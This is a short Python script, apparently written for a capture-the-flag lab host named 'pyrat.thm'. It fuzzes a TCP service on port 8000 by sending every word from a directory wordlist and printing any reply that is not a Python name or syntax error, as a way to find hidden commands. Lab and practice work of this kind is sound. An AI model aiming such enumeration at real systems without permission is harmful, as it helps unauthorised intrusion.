import socket

# Setting up the host
host = 'pyrat.thm'
port = 8000

# Setting up the wordlist
wordlist = "/home/kali/Documents/directory-list-2.3-medium.txt"

# Fuzzing function
def fuzz_endpoint(wordlist):
    try:
        with open(wordlist, 'r') as file:
            for word in file:
                command = word.strip()

                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, port))
                    s.sendall((command + '\n').encode())

                    response = s.recv(1024).decode().strip()

                    if response and "is not defined" not in response and "leading zeros" not in response:
                        print(f"Valid Response: {response}")
                        print(f"Payload Used: {command}")

    except FileNotFoundError:
        print("Wordlist file not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

# Run the fuzzer
fuzz_endpoint(wordlist)
